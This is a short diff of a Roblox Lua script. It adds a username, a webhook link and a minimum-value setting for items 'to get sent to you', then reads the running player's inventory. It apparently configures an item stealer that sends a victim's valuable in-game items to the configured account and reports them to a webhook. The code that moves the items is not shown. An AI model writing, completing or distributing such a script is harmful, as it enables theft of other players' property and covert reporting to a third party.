@@ -1,3 +1,6 @@
+Username = "Your user here"
+Webhook = "your webhook link here"
+min_rap = 500000 -- minimum rap of each item you want to get sent to you.
 
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
